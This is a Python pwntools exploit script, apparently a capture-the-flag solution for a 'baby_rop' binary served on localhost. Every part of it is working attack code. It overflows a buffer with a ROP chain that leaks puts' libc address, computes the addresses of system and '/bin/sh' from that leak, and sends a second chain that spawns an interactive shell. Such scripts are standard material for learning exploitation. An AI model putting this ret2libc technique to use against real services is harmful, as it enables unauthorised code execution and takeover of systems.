from pwn import *

p = remote('localhost',40003)

#p = process('./baby_rop')

#pid = gdb.attach(p,gdbscript='')

puts_plt = p64(0x4004a0)
puts_got = p64(0x601018)

pop_rdi_ret = p64(0x0000000000400683)

vuln = p64(0x4005b7)

ret = p64(0x000000000040048e)

pad = 'A' * 18

# payload to leak
payload1 = pad
payload1 += pop_rdi_ret
payload1 += puts_got
payload1 += puts_plt
payload1 += vuln

p.sendlineafter('rop me\n',payload1)

p.recvline()
leak = u64(p.recv(6).ljust(8,'\0'))

print hex(leak)

system = leak - 0x32190 # 0x31550 libc 2.27 offset, server has 2.31
bin_sh = leak + 0x13000a # 0x1336ca libc 2.27 offset, server has 2.31

print hex(system)
print hex(bin_sh)

# payload to get shell
payload2 = pad
payload2 += pop_rdi_ret
payload2 += p64(bin_sh)
payload2 += ret
payload2 += p64(system)

p.sendlineafter('rop me\n',payload2)

p.interactive()
